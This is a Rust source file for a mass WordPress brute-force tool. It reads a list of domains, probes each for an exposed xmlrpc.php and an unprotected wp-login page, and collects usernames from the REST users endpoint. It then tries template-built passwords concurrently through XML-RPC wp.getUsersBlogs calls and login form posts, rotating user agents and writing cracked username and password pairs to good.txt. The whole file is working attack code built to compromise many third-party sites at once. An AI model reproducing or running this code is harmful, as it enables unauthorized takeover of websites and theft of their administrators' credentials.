use colored::*;
use regex::Regex;
use reqwest::header::{CONTENT_TYPE, USER_AGENT};
use std::fs;
use std::io::{self, BufRead, BufReader, Write};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::Duration;
use url::Url;

use crate::common::{build_client_pool, pick_client, parse_url, random_user_agent, save_content};

// ─── Constants ───────────────────────────────────────────────────────────────

/// How many URLs to read into memory at once before processing
const BATCH_SIZE: usize = 10_000;

// ─── Password Loader ─────────────────────────────────────────────────────────

fn load_passwords(path: &str) -> String {
    fs::read_to_string(path).unwrap_or_else(|e| {
        eprintln!("{}", format!("Failed to load password list '{}': {}", path, e).red());
        std::process::exit(1);
    })
}

// ─── Brute Struct ────────────────────────────────────────────────────────────

struct Brute {
    url: String,
    thread_count: usize,
    user_agents: Arc<Vec<String>>,
    password_template: String,
    client: reqwest::Client,
    xmlrpc_lean: bool,
    wplogin_lean: bool,
}

impl Brute {
    fn new(
        url: String,
        thread_count: usize,
        user_agents: Arc<Vec<String>>,
        password_template: String,
        client: reqwest::Client,
    ) -> Self {
        Self {
            url,
            thread_count,
            user_agents,
            password_template,
            client,
            xmlrpc_lean: false,
            wplogin_lean: false,
        }
    }

    fn vuln(&self, msg: &str) {
        println!(
            "[{}] {} => {}",
            "#".green(),
            self.url,
            msg.green()
        );
    }

    fn failed(&self, msg: &str) {
        println!(
            "[{}] {} => {}",
            "#".red(),
            self.url,
            msg.red()
        );
    }

    fn ua(&self) -> String {
        random_user_agent(&self.user_agents)
    }

    // ── Username Enumeration ─────────────────────────────────────────────

    async fn search_username(&self) -> Vec<String> {
        let endpoint = format!("{}/wp-json/wp/v2/users", self.url);
        let res = self
            .client
            .get(&endpoint)
            .header(USER_AGENT, self.ua())
            .header("Accept-Language", "en-US,en;q=0.5")
            .timeout(Duration::from_secs(10))
            .send()
            .await;

        match res {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();
                if text.contains("slug") {
                    let re = Regex::new(r#""slug":"([^"]+)""#).unwrap();
                    let usernames: Vec<String> = re
                        .captures_iter(&text)
                        .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string()))
                        .collect();
                    if usernames.is_empty() {
                        self.failed("Cannot_Grab_Username");
                    }
                    usernames
                } else {
                    self.failed("No_Username");
                    vec![]
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed(&format!("{}", e));
                }
                vec![]
            }
        }
    }

    // ── Password Generation ──────────────────────────────────────────────

    fn set_password(&self, username: &str) -> Vec<String> {
        let parsed = Url::parse(&self.url).ok();
        let domain = parsed
            .as_ref()
            .and_then(|u| u.host_str())
            .unwrap_or("");

        let pw = self
            .password_template
            .replace("[UPPERLOGIN]", &username.to_uppercase())
            .replace("[WPLOGIN]", username)
            .replace("[DOMAIN]", domain)
            .replace("[UPPERDOMAIN]", &self.url.to_uppercase())
            .replace("[FULLDOMAIN]", &self.url);

        pw.lines()
            .filter(|l| !l.is_empty())
            .map(|l| l.to_string())
            .collect()
    }

    // ── XML-RPC Vulnerability Check ──────────────────────────────────────

    async fn is_vuln_xmlrpc(&self) -> bool {
        let endpoint = format!("{}/xmlrpc.php", self.url);

        let res = self
            .client
            .get(&endpoint)
            .header(USER_AGENT, self.ua())
            .timeout(Duration::from_secs(10))
            .send()
            .await;

        match res {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();
                if text.contains("XML-RPC server accepts POST requests only.") {
                    let payload = r#"<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"#;
                    let post_res = self
                        .client
                        .post(&endpoint)
                        .header(CONTENT_TYPE, "text/xml")
                        .header(USER_AGENT, self.ua())
                        .timeout(Duration::from_secs(5))
                        .body(payload)
                        .send()
                        .await;

                    match post_res {
                        Ok(post_resp) => {
                            let post_text = post_resp.text().await.unwrap_or_default();
                            if post_text.contains("wp.getUsersBlogs") {
                                self.vuln("Vuln_Xmlrpc");
                                return true;
                            }
                        }
                        Err(_) => {}
                    }
                }
                self.failed("Xmlrpc");
                false
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed(&format!("{}", e));
                }
                false
            }
        }
    }

    // ── WP-Login Vulnerability Check ─────────────────────────────────────

    async fn is_vuln_wp_login(&self) -> bool {
        let endpoint = format!("{}/wp-login.php", self.url);

        let res = self
            .client
            .get(&endpoint)
            .header(USER_AGENT, self.ua())
            .timeout(Duration::from_secs(10))
            .send()
            .await;

        match res {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();
                if text.contains("user_login") && !text.contains("captcha") {
                    self.vuln("WpLogin");
                    true
                } else {
                    self.failed("WpLogin_Not_Vuln");
                    false
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed(&format!("{}", e));
                }
                false
            }
        }
    }

    // ── Get Cookies (session init) ───────────────────────────────────────

    async fn get_cookies(&self) -> bool {
        self.client
            .get(&self.url)
            .header(USER_AGENT, self.ua())
            .send()
            .await
            .is_ok()
    }

    // ── XML-RPC Brute Force ──────────────────────────────────────────────

    async fn brute_xmlrpc(&self, username: &str, passwords: &[String]) -> bool {
        let endpoint = Arc::new(format!("{}/xmlrpc.php", self.url));
        let found = Arc::new(AtomicBool::new(false));
        let sem = Arc::new(Semaphore::new(self.thread_count));
        let mut handles = vec![];

        for password in passwords {
            if found.load(Ordering::Relaxed) {
                break;
            }

            let sem = sem.clone();
            let found = found.clone();
            let client = self.client.clone();
            let endpoint = endpoint.clone();
            let ua = self.ua();
            let url = self.url.clone();
            let username = username.to_string();
            let password = password.clone();

            handles.push(tokio::spawn(async move {
                let _permit = sem.acquire().await.unwrap();
                if found.load(Ordering::Relaxed) {
                    return false;
                }

                let payload = format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>"#,
                    username, password
                );

                let res = client
                    .post(endpoint.as_str())
                    .header(CONTENT_TYPE, "text/xml")
                    .header(USER_AGENT, &ua)
                    .timeout(Duration::from_secs(10))
                    .body(payload)
                    .send()
                    .await;

                match res {
                    Ok(resp) => {
                        let text = resp.text().await.unwrap_or_default();
                        if text.contains("<member><name>isAdmin</name><value>") {
                            found.store(true, Ordering::Relaxed);
                            println!(
                                "[{}] {} => {}",
                                "XMLRPC".yellow(),
                                url,
                                format!("{}|{}", username, password).green()
                            );
                            save_content(
                                "good.txt",
                                &format!("{}/wp-login.php#{}@{}", url, username, password),
                            )
                            .await;
                            return true;
                        } else {
                            println!(
                                "[{}] {} => {}",
                                "XMLRPC".yellow(),
                                url,
                                format!("{}|{}", username, password).red()
                            );
                        }
                    }
                    Err(e) => {
                        if e.is_timeout() {
                            println!("[{}] {} => {}", "#".red(), url, "Timeout".red());
                        } else {
                            println!("[{}] {} => {}", "#".red(), url, format!("{}", e).red());
                        }
                    }
                }
                false
            }));
        }

        for handle in handles {
            if let Ok(true) = handle.await {
                return true;
            }
        }
        false
    }

    // ── WP-Login Brute Force ─────────────────────────────────────────────

    async fn brute_wp_login(&self, username: &str, passwords: &[String]) -> bool {
        let endpoint = Arc::new(format!("{}/wp-login.php", self.url));
        let found = Arc::new(AtomicBool::new(false));
        let sem = Arc::new(Semaphore::new(self.thread_count));
        let mut handles = vec![];

        for password in passwords {
            if found.load(Ordering::Relaxed) {
                break;
            }

            let sem = sem.clone();
            let found = found.clone();
            let client = self.client.clone();
            let endpoint = endpoint.clone();
            let ua = self.ua();
            let url = self.url.clone();
            let username = username.to_string();
            let password = password.clone();

            handles.push(tokio::spawn(async move {
                let _permit = sem.acquire().await.unwrap();
                if found.load(Ordering::Relaxed) {
                    return false;
                }

                let params = [
                    ("log", username.as_str()),
                    ("pwd", password.as_str()),
                    ("wp-submit", "Log-In"),
                    ("redirect_to", &format!("{}/wp-admin/", url)),
                    ("testcookie", "1"),
                ];

                let res = client
                    .post(endpoint.as_str())
                    .header(USER_AGENT, &ua)
                    .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
                    .form(&params)
                    .timeout(Duration::from_secs(10))
                    .send()
                    .await;

                match res {
                    Ok(resp) => {
                        let final_url = resp.url().to_string();
                        let text = resp.text().await.unwrap_or_default();
                        // Must NOT contain login error indicators
                        let has_login_error = text.contains("login_error")
                            || text.contains("user_login")
                            || text.contains("Passwort vergessen")
                            || text.contains("Lost your password")
                            || text.contains("incorrect")
                            || text.contains("not correct");
                        // Must show real dashboard signs OR redirect to wp-admin
                        let has_dashboard = final_url.contains("/wp-admin/")
                            || (text.contains("/wp-admin/admin-ajax.php")
                                && text.contains("adminmenu"));
                        if !has_login_error && has_dashboard {
                            found.store(true, Ordering::Relaxed);
                            println!(
                                "[{}] {} => {}",
                                "WPLOGIN".blue(),
                                url,
                                format!("{}|{}", username, password).green()
                            );
                            save_content(
                                "good.txt",
                                &format!("{}/wp-login.php#{}@{}", url, username, password),
                            )
                            .await;
                            return true;
                        } else {
                            println!(
                                "[{}] {} => {}",
                                "WPLOGIN".blue(),
                                url,
                                format!("{}|{}", username, password).red()
                            );
                        }
                    }
                    Err(e) => {
                        if e.is_timeout() {
                            println!("[{}] {} => {}", "#".red(), url, "Timeout".red());
                        } else {
                            println!("[{}] {} => {}", "#".red(), url, format!("{}", e).red());
                        }
                    }
                }
                false
            }));
        }

        for handle in handles {
            if let Ok(true) = handle.await {
                return true;
            }
        }
        false
    }

    // ── Main Orchestration ───────────────────────────────────────────────

    async fn start(&mut self) {
        if self.is_vuln_xmlrpc().await {
            self.xmlrpc_lean = true;
        }
        if self.is_vuln_wp_login().await {
            if self.get_cookies().await {
                self.wplogin_lean = true;
            }
        }

        if !self.xmlrpc_lean && !self.wplogin_lean {
            return;
        }

        save_content("wordpress.txt", &self.url).await;

        let usernames = self.search_username().await;
        if usernames.is_empty() {
            return;
        }

        for user in &usernames {
            let passwords = self.set_password(user);
            let mut handles = vec![];

            if self.xmlrpc_lean {
                let url = self.url.clone();
                let ua_pool = self.user_agents.clone();
                let user = user.clone();
                let passwords = passwords.clone();
                let pw_template = self.password_template.clone();
                let tc = self.thread_count;
                let client = self.client.clone();

                handles.push(tokio::spawn(async move {
                    let brute = Brute::new(url, tc, ua_pool, pw_template, client);
                    brute.brute_xmlrpc(&user, &passwords).await
                }));
            }

            if self.wplogin_lean {
                let url = self.url.clone();
                let ua_pool = self.user_agents.clone();
                let user = user.clone();
                let passwords = passwords.clone();
                let pw_template = self.password_template.clone();
                let tc = self.thread_count;
                let client = self.client.clone();

                handles.push(tokio::spawn(async move {
                    let brute = Brute::new(url, tc, ua_pool, pw_template, client);
                    brute.brute_wp_login(&user, &passwords).await
                }));
            }

            let mut found = false;
            for handle in handles {
                if let Ok(result) = handle.await {
                    if result {
                        found = true;
                    }
                }
            }

            if found {
                break;
            }
        }
    }
}

// ─── Batch Processing Helper ─────────────────────────────────────────────────

/// Process a single batch of URLs concurrently with bounded parallelism
async fn process_batch(
    batch: Vec<String>,
    thread_count: usize,
    user_agents: &Arc<Vec<String>>,
    password_template: &str,
    processed: &AtomicU64,
    total_lines: u64,
    client_pool: &[reqwest::Client],
) {
    let semaphore = Arc::new(Semaphore::new(thread_count));
    let mut handles = vec![];

    for (i, raw_url) in batch.into_iter().enumerate() {
        let sem = semaphore.clone();
        let ua_pool = user_agents.clone();
        let pw_template = password_template.to_string();
        let thread_count = thread_count;
        let client = pick_client(client_pool, i);

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();

            match parse_url(&raw_url).await {
                Some(url) => {
                    let mut brute = Brute::new(url, thread_count, ua_pool, pw_template, client);
                    brute.start().await;
                }
                None => {
                    println!(
                        "[{}] {} => {}",
                        "#".red(),
                        raw_url,
                        "Die Website".red()
                    );
                }
            }
        }));
    }

    for handle in handles {
        let _ = handle.await;
    }

    let done = processed.load(Ordering::Relaxed);
    if total_lines > 0 {
        eprintln!(
            "{}",
            format!(
                "[*] Progress: {}/{} lines processed ({:.1}%)",
                done,
                total_lines,
                (done as f64 / total_lines as f64) * 100.0
            )
            .cyan()
        );
    }
}

// ─── Count lines without loading file into memory ────────────────────────────

fn count_lines(path: &str) -> u64 {
    let file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return 0,
    };
    let reader = BufReader::with_capacity(1024 * 1024, file); // 1MB buffer
    reader.lines().count() as u64
}

// ─── Public Entry Point ──────────────────────────────────────────────────────

pub async fn run(user_agents: Arc<Vec<String>>) {
    println!(
        "{} | {}",
        "XML-RPC".yellow(),
        "WP-LOGIN BRUTE FORCE".yellow()
    );
    println!();

    let stdin = io::stdin();

    print!("- List : ");
    io::stdout().flush().unwrap();
    let mut list_path = String::new();
    stdin.lock().read_line(&mut list_path).unwrap();
    let list_path = list_path.trim().to_string();

    print!("- Password List [default: top-830_MCR.txt] : ");
    io::stdout().flush().unwrap();
    let mut pw_path = String::new();
    stdin.lock().read_line(&mut pw_path).unwrap();
    let pw_path = pw_path.trim();
    let pw_path = if pw_path.is_empty() {
        "top-830_MCR.txt"
    } else {
        pw_path
    };

    print!("- Thread : ");
    io::stdout().flush().unwrap();
    let mut thread_input = String::new();
    stdin.lock().read_line(&mut thread_input).unwrap();
    let thread_count: usize = thread_input.trim().parse().unwrap_or(10);

    print!("- Batch size [default: {}] : ", BATCH_SIZE);
    io::stdout().flush().unwrap();
    let mut batch_input = String::new();
    stdin.lock().read_line(&mut batch_input).unwrap();
    let batch_size: usize = batch_input.trim().parse().unwrap_or(BATCH_SIZE);

    let password_template = load_passwords(pw_path);

    // Build a pool of clients — each has its own cookie jar, no contention
    let pool_size = thread_count.min(200); // cap at 200 clients
    let client_pool = build_client_pool(pool_size);

    // Count total lines for progress tracking (fast scan, no data stored)
    eprint!("{}", "[*] Counting lines... ".cyan());
    let total_lines = count_lines(&list_path);
    eprintln!(
        "{}",
        format!("{} domains found", total_lines).green()
    );

    // Open file for streaming — NOT loading into memory
    let file = match std::fs::File::open(&list_path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("{}", format!("Failed to read list file: {}", e).red());
            return;
        }
    };

    // Use a large buffer for efficient I/O (8MB)
    let reader = BufReader::with_capacity(8 * 1024 * 1024, file);

    eprintln!(
        "{}",
        format!(
            "[*] Streaming mode: batch_size={}, threads={}, memory-safe for any file size",
            batch_size, thread_count
        )
        .green()
    );

    let processed = AtomicU64::new(0);
    let mut batch: Vec<String> = Vec::with_capacity(batch_size);
    let mut batch_num: u64 = 0;

    for line in reader.lines() {
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };

        let trimmed = line.trim().to_string();
        if trimmed.is_empty() {
            continue;
        }

        batch.push(trimmed);
        processed.fetch_add(1, Ordering::Relaxed);

        if batch.len() >= batch_size {
            batch_num += 1;
            eprintln!(
                "{}",
                format!(
                    "[*] Processing batch #{} ({} URLs)...",
                    batch_num,
                    batch.len()
                )
                .cyan()
            );

            process_batch(
                std::mem::take(&mut batch),
                thread_count,
                &user_agents,
                &password_template,
                &processed,
                total_lines,
                &client_pool,
            )
            .await;

            // Re-allocate with capacity for next batch
            batch = Vec::with_capacity(batch_size);
        }
    }

    // Process remaining URLs in the last (partial) batch
    if !batch.is_empty() {
        batch_num += 1;
        eprintln!(
            "{}",
            format!(
                "[*] Processing final batch #{} ({} URLs)...",
                batch_num,
                batch.len()
            )
            .cyan()
        );

        process_batch(
            batch,
            thread_count,
            &user_agents,
            &password_template,
            &processed,
            total_lines,
            &client_pool,
        )
        .await;
    }

    eprintln!(
        "{}",
        format!(
            "[✓] Done! Processed {} domains in {} batches.",
            processed.load(Ordering::Relaxed),
            batch_num
        )
        .green()
    );
}
